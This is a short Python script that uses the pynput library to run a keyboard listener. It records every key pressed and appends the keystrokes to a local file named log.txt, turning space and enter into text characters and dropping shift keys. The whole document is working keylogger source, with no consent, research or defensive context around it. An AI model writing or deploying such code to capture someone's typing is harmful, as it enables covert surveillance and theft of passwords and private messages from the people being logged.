from pynput.keyboard import Key, Listener 

def log_keystroke(key):
    """
    Function to log the captured keystrokes.
    
    Args:
        key (pynput.keyboard.Key): The key that was pressed.
    """
    key = str(key).replace("'", "")
    
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift_r' or key == 'Key.shift':
        key = ''
    
    
    with open("log.txt", "a") as f:
        f.write(key)



with Listener(on_press=log_keystroke) as listener:
     listener.join()

